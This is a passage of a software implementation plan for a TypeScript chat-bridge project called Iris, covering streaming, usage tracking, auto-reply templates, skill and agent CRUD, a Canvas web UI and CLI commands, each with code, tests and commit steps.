git commit -m "feat(streaming): add StreamCoalescer with paragraph/sentence/word breaking"
```

### Task 8: Wire streaming into EventHandler + MessageRouter

**Files:**
- Modify: `src/bridge/event-handler.ts` — emit "partial" events with deltas
- Modify: `src/bridge/message-router.ts` — create coalescers per session
- Modify: `src/config/types.ts` — add StreamingConfig to ChannelAccountConfig
- Modify: `src/config/schema.ts` — add streaming Zod schema

**Step 1: Add partial event to EventHandler**

In `event-handler.ts`, add to EventMap:
```typescript
partial: (sessionId: string, delta: string) => void;
```

In the `message.part.updated` handler, after accumulating text:
```typescript
if (part.type === "text" && event.properties?.delta) {
  this.events.emit("partial", sessionId, event.properties.delta as string);
}
```

**Step 2: Add StreamingConfig to config types**

```typescript
export interface StreamingConfig {
  readonly enabled: boolean;
  readonly minChars?: number;
  readonly idleMs?: number;
  readonly breakOn?: "paragraph" | "sentence" | "word";
  readonly editInPlace?: boolean;
}
```

Add to `ChannelAccountConfig`:
```typescript
readonly streaming?: StreamingConfig;
```

Add Zod schema for streaming in `schema.ts`.

**Step 3: Wire coalescer into MessageRouter**

In `handleInbound()`, after sending typing indicator and before `sendMessageAsync()`:

```typescript
// Create streaming coalescer if enabled for this channel
const streamConfig = channelConfig?.streaming;
if (streamConfig?.enabled) {
  const coalescerConfig = {
    enabled: true,
    minChars: streamConfig.minChars ?? 300,
    maxChars: PLATFORM_LIMITS[msg.channelId] ?? adapter?.capabilities.maxTextLength ?? 4096,
    idleMs: streamConfig.idleMs ?? 800,
    breakOn: streamConfig.breakOn ?? "paragraph" as const,
    editInPlace: streamConfig.editInPlace ?? false,
  };

  let lastMsgId: string | undefined;
  const coalescer = new StreamCoalescer(coalescerConfig, (text, isEdit) => {
    if (isEdit && lastMsgId && adapter?.editMessage) {
      adapter.editMessage({ messageId: lastMsgId, text, chatId: msg.chatId });
    } else {
      this.outboundQueue.enqueue({
        channelId: msg.channelId, chatId: msg.chatId, text, replyToId: msg.id,
      });
    }
  });

  // Listen for partials
  const partialHandler = (sid: string, delta: string) => {
    if (sid === entry.openCodeSessionId) coalescer.append(delta);
  };
  const responseHandler = (sid: string) => {
    if (sid === entry.openCodeSessionId) {
      coalescer.end();
      this.eventHandler.events.off("partial", partialHandler);
      this.eventHandler.events.off("response", responseHandler);
      this.pendingResponses.delete(sessionId);
    }
  };

  this.eventHandler.events.on("partial", partialHandler);
  this.eventHandler.events.on("response", responseHandler);
} else {
  // Existing behavior: wait for full response
}
```

**Step 4: Build + test**

Run: `pnpm run build && pnpm run test`
Expected: Clean

**Step 5: Commit**

```bash
git add src/bridge/event-handler.ts src/bridge/message-router.ts src/bridge/stream-coalescer.ts src/config/types.ts src/config/schema.ts
git commit -m "feat(streaming): wire StreamCoalescer into event handler and message router"
```

---

## Phase 4: Usage/Cost Tracking

### Task 9: Usage types + DB schema

**Files:**
- Create: `src/usage/types.ts`
- Modify: `src/vault/db.ts` — add usage_log table

**Step 1: Create types**

```typescript
// src/usage/types.ts
export interface UsageRecord {
  readonly sessionId: string | null;
  readonly senderId: string | null;
  readonly channelId: string | null;
  readonly modelId: string | null;
  readonly providerId: string | null;
  readonly tokensInput: number;
  readonly tokensOutput: number;
  readonly tokensReasoning: number;
  readonly tokensCacheRead: number;
  readonly tokensCacheWrite: number;
  readonly costUsd: number;
  readonly durationMs: number | null;
}

export interface UsageSummary {
  readonly totalTokens: number;
  readonly totalCost: number;
  readonly messageCount: number;
  readonly period: string;
  readonly breakdown: UsageBreakdown[];
}

export interface UsageBreakdown {
  readonly date: string;
  readonly tokens: number;
  readonly cost: number;
  readonly messages: number;
}
```

**Step 2: Add table to vault/db.ts**

In `SCHEMA_SQL`, add:
```sql
CREATE TABLE IF NOT EXISTS usage_log (
  id TEXT PRIMARY KEY,
  timestamp INTEGER NOT NULL,
  session_id TEXT,
  sender_id TEXT,
  channel_id TEXT,
  model_id TEXT,
  provider_id TEXT,
  tokens_input INTEGER DEFAULT 0,
  tokens_output INTEGER DEFAULT 0,
  tokens_reasoning INTEGER DEFAULT 0,
  tokens_cache_read INTEGER DEFAULT 0,
  tokens_cache_write INTEGER DEFAULT 0,
  cost_usd REAL DEFAULT 0,
  duration_ms INTEGER
);
CREATE INDEX IF NOT EXISTS idx_usage_sender ON usage_log(sender_id);
CREATE INDEX IF NOT EXISTS idx_usage_timestamp ON usage_log(timestamp);
```

**Step 3: Commit**

```bash
git add src/usage/types.ts src/vault/db.ts
git commit -m "feat(usage): add usage types and DB schema"
```

### Task 10: UsageTracker + tests

**Files:**
- Create: `src/usage/tracker.ts`
- Test: `test/unit/usage-tracker.test.ts`

**Step 1: Write the failing test**

```typescript
// test/unit/usage-tracker.test.ts
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { VaultDB } from "../../src/vault/db.js";
import { UsageTracker } from "../../src/usage/tracker.js";

describe("UsageTracker", () => {
  let db: VaultDB;
  let tracker: UsageTracker;
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "iris-usage-"));
    db = new VaultDB(dir);
    tracker = new UsageTracker(db);
  });

  afterEach(() => {
    db.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it("records and retrieves usage", () => {
    tracker.record({
      sessionId: "s1", senderId: "u1", channelId: "tg",
      modelId: "gpt-4", providerId: "openai",
      tokensInput: 100, tokensOutput: 50, tokensReasoning: 0,
      tokensCacheRead: 0, tokensCacheWrite: 0,
      costUsd: 0.005, durationMs: 1200,
    });
    const summary = tracker.summarize({ senderId: "u1" });
    expect(summary.totalTokens).toBe(150);
    expect(summary.totalCost).toBeCloseTo(0.005);
    expect(summary.messageCount).toBe(1);
  });

  it("summarizes by date range", () => {
    tracker.record({
      sessionId: "s1", senderId: "u1", channelId: "tg",
      modelId: "m", providerId: "p",
      tokensInput: 200, tokensOutput: 100, tokensReasoning: 0,
      tokensCacheRead: 0, tokensCacheWrite: 0,
      costUsd: 0.01, durationMs: null,
    });
    tracker.record({
      sessionId: "s2", senderId: "u1", channelId: "tg",
      modelId: "m", providerId: "p",
      tokensInput: 300, tokensOutput: 150, tokensReasoning: 0,
      tokensCacheRead: 0, tokensCacheWrite: 0,
      costUsd: 0.02, durationMs: null,
    });
    const summary = tracker.summarize({});
    expect(summary.messageCount).toBe(2);
    expect(summary.totalTokens).toBe(750);
    expect(summary.totalCost).toBeCloseTo(0.03);
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

```typescript
// src/usage/tracker.ts
import { randomUUID } from "node:crypto";
import type { VaultDB } from "../vault/db.js";
import type { UsageRecord, UsageSummary, UsageBreakdown } from "./types.js";

export class UsageTracker {
  constructor(private readonly db: VaultDB) {}

  record(entry: UsageRecord): string {
    const id = randomUUID();
    const timestamp = Date.now();
    this.db.db.prepare(`
      INSERT INTO usage_log (id, timestamp, session_id, sender_id, channel_id,
        model_id, provider_id, tokens_input, tokens_output, tokens_reasoning,
        tokens_cache_read, tokens_cache_write, cost_usd, duration_ms)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      id, timestamp, entry.sessionId, entry.senderId, entry.channelId,
      entry.modelId, entry.providerId, entry.tokensInput, entry.tokensOutput,
      entry.tokensReasoning, entry.tokensCacheRead, entry.tokensCacheWrite,
      entry.costUsd, entry.durationMs,
    );
    return id;
  }

  summarize(opts: { senderId?: string; since?: number; until?: number }): UsageSummary {
    const conditions: string[] = [];
    const params: unknown[] = [];

    if (opts.senderId) {
      conditions.push("sender_id = ?");
      params.push(opts.senderId);
    }
    if (opts.since) {
      conditions.push("timestamp >= ?");
      params.push(opts.since);
    }
    if (opts.until) {
      conditions.push("timestamp <= ?");
      params.push(opts.until);
    }

    const where = conditions.length > 0 ? `WHERE ${conditions.join(" AND ")}` : "";

    const row = this.db.db.prepare(`
      SELECT
        COALESCE(SUM(tokens_input + tokens_output + tokens_reasoning), 0) as total_tokens,
        COALESCE(SUM(cost_usd), 0) as total_cost,
        COUNT(*) as message_count
      FROM usage_log ${where}
    `).get(...params) as { total_tokens: number; total_cost: number; message_count: number };

    const dailyRows = this.db.db.prepare(`
      SELECT
        date(timestamp / 1000, 'unixepoch') as date,
        SUM(tokens_input + tokens_output + tokens_reasoning) as tokens,
        SUM(cost_usd) as cost,
        COUNT(*) as messages
      FROM usage_log ${where}
      GROUP BY date(timestamp / 1000, 'unixepoch')
      ORDER BY date DESC
      LIMIT 30
    `).all(...params) as Array<{ date: string; tokens: number; cost: number; messages: number }>;

    return {
      totalTokens: row.total_tokens,
      totalCost: row.total_cost,
      messageCount: row.message_count,
      period: opts.since ? `since ${new Date(opts.since).toISOString()}` : "all time",
      breakdown: dailyRows.map((r) => ({
        date: r.date,
        tokens: r.tokens,
        cost: r.cost,
        messages: r.messages,
      })),
    };
  }
}
```

**Step 4: Run test — expect PASS**

**Step 5: Commit**

```bash
git add src/usage/tracker.ts test/unit/usage-tracker.test.ts
git commit -m "feat(usage): add UsageTracker with record/summarize"
```

### Task 11: Wire usage tracking into event handler + tool-server + lifecycle

**Files:**
- Modify: `src/bridge/event-handler.ts` — emit "usage" event
- Modify: `src/bridge/tool-server.ts` — add /usage/* endpoints
- Modify: `src/gateway/lifecycle.ts` — create tracker, wire events
- Modify: `.opencode/plugin/iris.ts` — add usage_summary tool

**Step 1:** Add "usage" event to EventHandler EventMap, extract tokens/cost from message finish events.

**Step 2:** Add endpoints to tool-server:
- `POST /usage/record` — record entry
- `GET /usage/summary` — query with senderId, period params

**Step 3:** Add `usage_summary` tool to iris.ts plugin.

**Step 4:** In lifecycle.ts, create UsageTracker, wire it to eventHandler "usage" events via sessionMap reverse lookup.

**Step 5: Build + test**

Run: `pnpm run build && pnpm run test`

**Step 6: Commit**

```bash
git add src/bridge/event-handler.ts src/bridge/tool-server.ts src/gateway/lifecycle.ts .opencode/plugin/iris.ts
git commit -m "feat(usage): wire tracking into event handler, tool-server, and OpenCode plugin"
```

---

## Phase 5: Auto-Reply Templating

### Task 12: Auto-reply types + engine

**Files:**
- Create: `src/auto-reply/types.ts`
- Create: `src/auto-reply/engine.ts`
- Test: `test/unit/auto-reply-engine.test.ts`

**Step 1: Write types**

```typescript
// src/auto-reply/types.ts
export interface AutoReplyTemplate {
  readonly id: string;
  readonly trigger: TemplateTrigger;
  readonly response: string;
  readonly priority?: number;
  readonly cooldown?: number;
  readonly once?: boolean;
  readonly channels?: string[];
  readonly chatTypes?: ("dm" | "group")[];
  readonly forwardToAi?: boolean;
}

export type TemplateTrigger =
  | { readonly type: "exact"; readonly pattern: string }
  | { readonly type: "regex"; readonly pattern: string }
  | { readonly type: "keyword"; readonly words: string[] }
  | { readonly type: "command"; readonly name: string }
  | { readonly type: "schedule"; readonly when: ScheduleCondition };

export interface ScheduleCondition {
  readonly hours?: [number, number];
  readonly days?: number[];
  readonly timezone?: string;
}

export interface TemplateMatch {
  readonly template: AutoReplyTemplate;
  readonly response: string;
}
```

**Step 2: Write the failing test**

```typescript
// test/unit/auto-reply-engine.test.ts
import { describe, it, expect } from "vitest";
import { TemplateEngine } from "../../src/auto-reply/engine.js";
import type { InboundMessage } from "../../src/channels/adapter.js";

const msg = (text: string, overrides?: Partial<InboundMessage>): InboundMessage => ({
  id: "1", channelId: "telegram", senderId: "user1", senderName: "Test",
  chatId: "chat1", chatType: "dm", text, timestamp: Date.now(), ...overrides,
});

describe("TemplateEngine", () => {
  it("matches exact trigger (case-insensitive)", () => {
    const engine = new TemplateEngine([
      { id: "start", trigger: { type: "exact", pattern: "/start" }, response: "Welcome!" },
    ]);
    const match = engine.match(msg("/start"));
    expect(match).not.toBeNull();
    expect(match!.response).toBe("Welcome!");
  });

  it("matches regex trigger", () => {
    const engine = new TemplateEngine([
      { id: "price", trigger: { type: "regex", pattern: "(?i)how much|price|cost" }, response: "Check pricing.com" },
    ]);
    expect(engine.match(msg("How much does it cost?"))).not.toBeNull();
    expect(engine.match(msg("What time is it?"))).toBeNull();
  });

  it("matches keyword trigger", () => {
    const engine = new TemplateEngine([
      { id: "help", trigger: { type: "keyword", words: ["help", "assist"] }, response: "How can I help?" },
    ]);
    expect(engine.match(msg("I need help please"))).not.toBeNull();
    expect(engine.match(msg("Hello there"))).toBeNull();
  });

  it("matches command trigger", () => {
    const engine = new TemplateEngine([
      { id: "status", trigger: { type: "command", name: "status" }, response: "All systems go." },
    ]);
    expect(engine.match(msg("/status"))).not.toBeNull();
    expect(engine.match(msg("check status"))).toBeNull();
  });

  it("interpolates variables", () => {
    const engine = new TemplateEngine([
      { id: "greet", trigger: { type: "exact", pattern: "hi" }, response: "Hello {sender.name}!" },
    ]);
    const match = engine.match(msg("hi", { senderName: "Alice" }));
    expect(match!.response).toBe("Hello Alice!");
  });

  it("respects priority order", () => {
    const engine = new TemplateEngine([
      { id: "low", trigger: { type: "keyword", words: ["help"] }, response: "Low priority", priority: 1 },
      { id: "high", trigger: { type: "keyword", words: ["help"] }, response: "High priority", priority: 10 },
    ]);
    expect(engine.match(msg("help"))!.response).toBe("High priority");
  });

  it("respects channel filter", () => {
    const engine = new TemplateEngine([
      { id: "tg-only", trigger: { type: "exact", pattern: "hi" }, response: "TG!", channels: ["telegram"] },
    ]);
    expect(engine.match(msg("hi", { channelId: "telegram" }))).not.toBeNull();
    expect(engine.match(msg("hi", { channelId: "discord" }))).toBeNull();
  });

  it("enforces cooldown", () => {
    const engine = new TemplateEngine([
      { id: "cool", trigger: { type: "exact", pattern: "hi" }, response: "Hey!", cooldown: 60 },
    ]);
    expect(engine.match(msg("hi"))).not.toBeNull();
    expect(engine.match(msg("hi"))).toBeNull(); // Cooldown active
  });

  it("enforces once per sender", () => {
    const engine = new TemplateEngine([
      { id: "once", trigger: { type: "exact", pattern: "hi" }, response: "First time!", once: true },
    ]);
    expect(engine.match(msg("hi"))).not.toBeNull();
    expect(engine.match(msg("hi"))).toBeNull();
  });
});
```

**Step 3: Run test — expect FAIL**

**Step 4: Implement**

```typescript
// src/auto-reply/engine.ts
import type { InboundMessage } from "../channels/adapter.js";
import type { AutoReplyTemplate, TemplateMatch } from "./types.js";

export class TemplateEngine {
  private readonly templates: AutoReplyTemplate[];
  private readonly cooldowns = new Map<string, number>();
  private readonly onceFired = new Set<string>();

  constructor(templates: AutoReplyTemplate[]) {
    this.templates = [...templates].sort((a, b) => (b.priority ?? 0) - (a.priority ?? 0));
  }

  match(msg: InboundMessage): TemplateMatch | null {
    const text = msg.text ?? "";
    for (const tpl of this.templates) {
      if (tpl.channels && !tpl.channels.includes(msg.channelId)) continue;
      if (tpl.chatTypes && !tpl.chatTypes.includes(msg.chatType)) continue;

      const coolKey = `${tpl.id}:${msg.senderId}`;
      if (tpl.cooldown) {
        const last = this.cooldowns.get(coolKey);
        if (last && Date.now() - last < tpl.cooldown * 1000) continue;
      }
      if (tpl.once && this.onceFired.has(coolKey)) continue;

      if (!this.triggerMatches(tpl.trigger, text)) continue;

      // Match found
      if (tpl.cooldown) this.cooldowns.set(coolKey, Date.now());
      if (tpl.once) this.onceFired.add(coolKey);

      return { template: tpl, response: this.render(tpl.response, msg) };
    }
    return null;
  }

  private triggerMatches(trigger: AutoReplyTemplate["trigger"], text: string): boolean {
    switch (trigger.type) {
      case "exact":
        return text.toLowerCase().trim() === trigger.pattern.toLowerCase().trim();
      case "regex":
        return new RegExp(trigger.pattern, "i").test(text);
      case "keyword":
        return trigger.words.some((w) => text.toLowerCase().includes(w.toLowerCase()));
      case "command":
        return text.trim().toLowerCase().startsWith(`/${trigger.name.toLowerCase()}`);
      case "schedule":
        return this.scheduleActive(trigger.when);
    }
  }

  private scheduleActive(when: { hours?: [number, number]; days?: number[] }): boolean {
    const now = new Date();
    if (when.hours) {
      const hour = now.getHours();
      if (hour < when.hours[0] || hour >= when.hours[1]) return false;
    }
    if (when.days) {
      if (!when.days.includes(now.getDay())) return false;
    }
    return true;
  }

  private render(template: string, msg: InboundMessage): string {
    return template
      .replace(/\{sender\.name\}/g, msg.senderName ?? "there")
      .replace(/\{sender\.id\}/g, msg.senderId)
      .replace(/\{channel\}/g, msg.channelId)
      .replace(/\{time\}/g, new Date().toLocaleTimeString())
      .replace(/\{date\}/g, new Date().toLocaleDateString());
  }
}
```

**Step 5: Run test — expect PASS**

**Step 6: Commit**

```bash
git add src/auto-reply/types.ts src/auto-reply/engine.ts test/unit/auto-reply-engine.test.ts
git commit -m "feat(auto-reply): add TemplateEngine with regex/keyword/command/schedule triggers"
```

### Task 13: Wire auto-reply into MessageRouter + config

**Files:**
- Modify: `src/bridge/message-router.ts` — check templates before routing
- Modify: `src/config/types.ts` — add AutoReplyConfig
- Modify: `src/config/schema.ts` — add auto-reply Zod schema
- Modify: `src/gateway/lifecycle.ts` — construct TemplateEngine, pass to router

**Step 1:** Add `AutoReplyConfig` to config types and schema.

**Step 2:** In MessageRouter constructor, accept optional `TemplateEngine`. In `handleInbound()`, after security check and before session resolution, call `templateEngine.match(msg)`. If matched, send response directly and return (unless `forwardToAi`).

**Step 3:** In lifecycle.ts, construct `TemplateEngine` from config and pass to router.

**Step 4: Build + test**

Run: `pnpm run build && pnpm run test`

**Step 5: Commit**

```bash
git add src/bridge/message-router.ts src/config/types.ts src/config/schema.ts src/gateway/lifecycle.ts
git commit -m "feat(auto-reply): wire template engine into message router and config"
```

---

## Phase 6: Skill Creator + Agent Creator

### Task 14: Skill CRUD endpoints

**Files:**
- Modify: `src/bridge/tool-server.ts` — add /skills/* endpoints

**Step 1:** Add endpoints:
- `POST /skills/create` — write SKILL.md to `.opencode/skills/{name}/SKILL.md`
- `GET /skills/list` — glob + parse frontmatter from all skills
- `POST /skills/delete` — rmSync skill directory
- `POST /skills/validate` — check frontmatter schema

Use a simple YAML frontmatter generator (template string, no lib needed since skills are simple).

**Step 2: Commit**

```bash
git add src/bridge/tool-server.ts
git commit -m "feat(skills): add CRUD endpoints for skill management"
```

### Task 15: Agent CRUD endpoints

**Files:**
- Modify: `src/bridge/tool-server.ts` — add /agents/* endpoints

**Step 1:** Add endpoints:
- `POST /agents/create` — write agent markdown to `.opencode/agents/{name}.md`
- `GET /agents/list` — glob + parse frontmatter from all agents
- `POST /agents/delete` — rmSync agent file
- `POST /agents/validate` — check frontmatter schema

**Step 2: Commit**

```bash
git add src/bridge/tool-server.ts
git commit -m "feat(agents): add CRUD endpoints for agent management"
```

### Task 16: Register skill + agent tools in OpenCode plugin

**Files:**
- Modify: `.opencode/plugin/iris.ts` — add 6 new tools

**Step 1:** Add tools to the plugin tool map:
- `skill_create`, `skill_list`, `skill_delete`
- `agent_create`, `agent_list`, `agent_delete`

Each tool calls the corresponding tool-server endpoint via `irisPost` or `irisGet`.

**Step 2: Commit**

```bash
git add .opencode/plugin/iris.ts
git commit -m "feat(skills,agents): register creator tools in OpenCode plugin"
```

### Task 17: Tests for skill + agent endpoints

**Files:**
- Test: `test/unit/skill-agent-endpoints.test.ts`

Write tests that:
1. Create a skill via POST /skills/create, verify file exists
2. List skills via GET /skills/list, verify the created skill appears
3. Delete skill via POST /skills/delete, verify file removed
4. Same for agents: create, list, delete
5. Validate rejects invalid names (with spaces, uppercase, etc.)

**Commit:**

```bash
git add test/unit/skill-agent-endpoints.test.ts
git commit -m "test: add tests for skill and agent CRUD endpoints"
```

---

## Phase 7: Canvas + A2UI

### Task 18: Canvas component types

**Files:**
- Create: `src/canvas/components.ts`

```typescript
// src/canvas/components.ts
export type CanvasComponent =
  | TextComponent
  | MarkdownComponent
  | FormComponent
  | ChartComponent
  | ImageComponent
  | TableComponent
  | CodeComponent
  | ButtonComponent
  | ProgressComponent;

export interface TextComponent {
  readonly type: "text";
  readonly id: string;
  readonly content: string;
}

export interface MarkdownComponent {
  readonly type: "markdown";
  readonly id: string;
  readonly content: string;
}

export interface FormComponent {
  readonly type: "form";
  readonly id: string;
  readonly fields: FormField[];
}

export interface FormField {
  readonly name: string;
  readonly type: "text" | "number" | "select" | "checkbox" | "textarea" | "slider";
  readonly label: string;
  readonly options?: string[];
  readonly min?: number;
  readonly max?: number;
  readonly required?: boolean;
  readonly value?: unknown;
}

export interface ChartComponent {
  readonly type: "chart";
  readonly id: string;
  readonly chartType: "bar" | "line" | "pie";
  readonly data: { labels: string[]; datasets: Array<{ label: string; data: number[]; color?: string }> };
}

export interface ImageComponent {
  readonly type: "image";
  readonly id: string;
  readonly url: string;
  readonly alt?: string;
}

export interface TableComponent {
  readonly type: "table";
  readonly id: string;
  readonly headers: string[];
  readonly rows: string[][];
}

export interface CodeComponent {
  readonly type: "code";
  readonly id: string;
  readonly language: string;
  readonly content: string;
}

export interface ButtonComponent {
  readonly type: "button";
  readonly id: string;
  readonly label: string;
  readonly action: string;
}

export interface ProgressComponent {
  readonly type: "progress";
  readonly id: string;
  readonly value: number;
  readonly max: number;
  readonly label?: string;
}
```

Commit: `git add src/canvas/components.ts && git commit -m "feat(canvas): add component type definitions"`

### Task 19: CanvasSession

**Files:**
- Create: `src/canvas/session.ts`
- Test: `test/unit/canvas-session.test.ts`

CanvasSession manages component state per connected client. Supports add/update/clear components and broadcasts to connected WebSocket clients.

Test: state management (render, append, clear, remove by ID).

Commit: `git commit -m "feat(canvas): add CanvasSession state management"`

### Task 20: Canvas HTML renderer

**Files:**
- Create: `src/canvas/renderer.ts`

Self-contained HTML string (exported as a function that returns HTML). Includes:
- Chat input + message list
- Component rendering area
- WebSocket connection logic
- CDN imports: Chart.js, Marked.js, highlight.js
- Vanilla JS component renderer (switch on component.type)
- CSS: dark theme, responsive, clean

No build step. Just a template literal that returns a full HTML page.

Commit: `git commit -m "feat(canvas): add self-contained HTML renderer"`

### Task 21: CanvasServer (Hono + WebSocket)

**Files:**
- Create: `src/canvas/server.ts`
- Test: `test/unit/canvas-server.test.ts`

Hono server with:
- `GET /` — serve canvas HTML
- `GET /canvas/:sessionId` — serve canvas for specific session
- WebSocket upgrade at `/ws/:sessionId`
- `POST /api/message` — REST endpoint for sending messages
- `GET /api/sessions` — list active canvas sessions

WebSocket handling:
- On connect: create or join CanvasSession, send current state
- On message: parse JSON, if type="message" forward to Iris message flow
- On user_action: forward to agent as a message
- On disconnect: remove client from session

Test: HTTP endpoints return correct responses, session creation.

Commit: `git commit -m "feat(canvas): add CanvasServer with WebSocket + REST"`

### Task 22: WebChatAdapter (channel)

**Files:**
- Create: `src/channels/webchat/index.ts`
- Create: `src/channels/webchat/normalize.ts`

Implements `ChannelAdapter` interface. Receives messages from CanvasServer WebSocket, emits them as `InboundMessage` events. Sends responses back through WebSocket.

The adapter and CanvasServer share a reference so messages flow both ways.

Commit: `git commit -m "feat(canvas): add WebChatAdapter channel"`

### Task 23: Wire Canvas into lifecycle + config + iris.ts

**Files:**
- Modify: `src/gateway/lifecycle.ts` — start CanvasServer, register webchat channel
- Modify: `src/config/types.ts` — add CanvasConfig
- Modify: `src/config/schema.ts` — add canvas Zod schema
- Modify: `.opencode/plugin/iris.ts` — add canvas_update tool

Config:
```typescript
export interface CanvasConfig {
  readonly enabled: boolean;
  readonly port: number;
  readonly hostname: string;
}
```

In lifecycle: start canvas server after tool server. Wire WebChatAdapter.

In iris.ts: add `canvas_update` tool that calls `POST /canvas/update`.

In tool-server.ts: add `POST /canvas/update` endpoint that finds CanvasSession and broadcasts component updates.

Commit: `git commit -m "feat(canvas): wire Canvas+A2UI into lifecycle, config, and OpenCode plugin"`

---

## Phase 8: CLI Commands

### Task 24: `iris scan` CLI command

**Files:**
- Create: `src/cli/commands/scan.ts`
- Modify: `src/cli/program.ts` — register command

Clipanion command that accepts a path argument, runs SecurityScanner, prints results as a table with colors (CRITICAL=red, WARN=yellow, INFO=blue).

Commit: `git commit -m "feat(cli): add iris scan command for security scanning"`

---

## Phase 9: OpenCode Plugin Manifest Integration

### Task 25: Dynamic tool registration in iris.ts

**Files:**
- Modify: `.opencode/plugin/iris.ts` — read plugin-tools.json, generate tool wrappers

At plugin init, check for `~/.iris/plugin-tools.json`. For each tool in the manifest, generate an OpenCode tool definition that calls `POST /tool/plugin/{name}`.

This lets plugin-registered tools be callable by the AI without editing iris.ts.

Commit: `git commit -m "feat(plugins): dynamic tool registration from plugin manifest"`

---

## Phase 10: Integration Tests + Final Wiring

### Task 26: Integration test — plugin loading + tool execution

**Files:**
- Test: `test/integration/plugin-sdk.test.ts`

Create a temp plugin, load it via PluginLoader, verify tool is registered, call tool endpoint, verify response.

Commit: `git commit -m "test: add plugin SDK integration test"`

### Task 27: Integration test — streaming pipeline

**Files:**
- Test: `test/integration/streaming.test.ts`

Create a StreamCoalescer, feed it deltas, verify flush callbacks fire at correct thresholds.

Commit: `git commit -m "test: add streaming pipeline integration test"`

### Task 28: Integration test — auto-reply bypass

**Files:**
- Test: `test/integration/auto-reply.test.ts`

Create TemplateEngine with templates, send messages through, verify auto-replies fire and non-matching messages pass through.

Commit: `git commit -m "test: add auto-reply integration test"`

### Task 29: Full build + lint + test verification

Run:
```bash
pnpm run build
pnpm run lint
pnpm run test
```

Fix any issues. Final commit:

```bash
git commit -m "chore: fix build/lint issues from v2 features"
```

### Task 30: Update documentation

**Files:**
- Modify: `README.md` — add Plugin SDK, Canvas, Scanner sections
- Modify: `docs/cookbook.md` — add plugin examples, streaming config, auto-reply examples
- Modify: `AGENTS.md` — add new tools (usage_summary, skill_create, agent_create, canvas_update)

Commit:

```bash
git add README.md docs/cookbook.md AGENTS.md
git commit -m "docs: update docs for v2 features"
```

---

## Summary

| Phase | Tasks | New files | Est. tests |
|-------|-------|-----------|------------|
| 1. Security Scanner | 1 | 3 | 8 |
| 2. Plugin SDK | 2-6 | 4 | 10 |
| 3. Streaming | 7-8 | 1 | 6 |
| 4. Usage Tracking | 9-11 | 2 | 4 |
| 5. Auto-Reply | 12-13 | 2 | 9 |
| 6. Skill+Agent Creator | 14-17 | 0 (endpoints) | 10 |
| 7. Canvas+A2UI | 18-23 | 6 | 8 |
| 8. CLI | 24 | 1 | 2 |
| 9. Plugin Manifest | 25 | 0 | 2 |
| 10. Integration | 26-30 | 3 (tests) | 6 |
| **Total** | **30** | **~22** | **~65** |
